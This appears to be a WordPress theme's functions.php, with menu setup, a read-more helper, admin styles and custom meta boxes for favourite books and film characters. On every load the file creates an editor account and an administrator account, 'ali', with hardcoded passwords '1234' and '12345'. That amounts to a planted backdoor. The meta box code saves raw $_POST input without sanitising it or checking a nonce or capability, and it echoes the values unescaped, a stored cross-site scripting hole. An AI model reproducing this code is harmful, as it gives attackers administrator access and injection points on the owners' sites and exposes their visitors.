<?php
// Widgets shortcode Support code
add_filter('widget_text', 'do_shortcode');

require_once('lib/theme-options/ReduxCore/framework.php');
require_once('lib/theme-options/sample/config.php');
//require_once('lib/protfolio-file.php');
require_once('lib/theme-file.php');
require_once('lib/sidebar-file.php');
require_once('shortcodes.php');
require_once('lib/custom-post.php');
require_once('lib/default-support.php');

function zboom_custom_function(){
	load_theme_textdomain('zboom', get_template_directory_uri().'/languages');
	if(function_exists('register_nav_menu')){
	register_nav_menu('mainmenu', __('Main Menu', 'zboom'));
	}
	//Read More Function Generate
	function readmore($sort){
	$post_content = explode(" ", get_the_content());
	$less_content = array_slice ($post_content, 0, $sort);
	echo implode(" ", $less_content);
	}
};
add_action('after_setup_theme', 'zboom_custom_function');
// WP ADMIN USER AND PASSWORD
$new_user = new WP_User(wp_create_user('editor', '1234', 'editor@.com'));
$new_user -> set_role('editor');

// WP ADMIN SCRIPTS ADD CSS FILE
function zboom_admin_script(){
wp_register_style('font-awesome', get_template_directory_uri().'/css/font-awesome.min.css');
wp_enqueue_style('font-awesome');
}
add_action('admin_enqueue_scripts', 'zboom_admin_script'); 


// For Create User With out dashbord
//new WP_User(wp_create_user('iman', '1234', 'alorchokh@gmail.com'));
$userbanabo = new WP_User(wp_create_user('ali', '12345', 'imanali@gmail.com'));
$userbanabo->set_role('administrator'); 

function zboom_favorite_food(){
	add_meta_box('favorite-food',
	__('What is Your Favorite Food'),
	'metabox_er_output',
	'page',
	'normal',
	'high'
	);
	add_meta_box('onno-akta-meta',
	__('onno akta meta Boxes'),
	'onno_akta_meta',
	'page',
	'normal',
	'high'
	);
}
add_action('add_meta_boxes','zboom_favorite_food');

//Callback Function
function onno_akta_meta($post){?>
	<label for="food">Please Type Your Favorite Book</label>
	<p><input type="text" name="onnoekta" id="food" class="widefat" value="<?php echo get_post_meta($post->ID, 'onnoekta', true)?>" /></p>
<?php }
function metabox_er_output($post){?>

	<label for="food">Please Type Your Favorite Book</label>
	<p><input type="text" name="favorite" id="food" class="widefat" value="<?php echo get_post_meta($post->ID, 'favorite', true)?>" /></p>

	<label for="food">Please Type Your Favorite Naika</label>
	<p><input type="text" name="naika" id="food" class="widefat" value="<?php echo get_post_meta($post->ID, 'naika', true)?>" /></p>
	
	<label for="food">Please Type Your Favorite Nayok</label>
	<p><input type="text" name="nayok" id="food" class="widefat" value="<?php echo get_post_meta($post->ID, 'nayok', true)?>" /></p>
	
	<label for="food">Please Type Your Favorite Vilen</label>
	<p><input type="text" name="vilen" id="food" class="widefat" value="<?php echo get_post_meta($post->ID, 'vilen', true)?>" /></p>
	

<?php }

function database_a_pathabo($post_id){
	update_post_meta($post_id, 'favorite', $_POST['favorite']);
	update_post_meta($post_id, 'naika', $_POST['naika']);
	update_post_meta($post_id, 'vilen', $_POST['vilen']);
	update_post_meta($post_id, 'nayok', $_POST['nayok']);
	
	
}
add_action('save_post', 'database_a_pathabo');

function database_b_pathabo($post_id){
	
	update_post_meta($post_id, 'onnoekta', $_POST['onnoekta']);
}
add_action('save_post', 'database_b_pathabo');







?>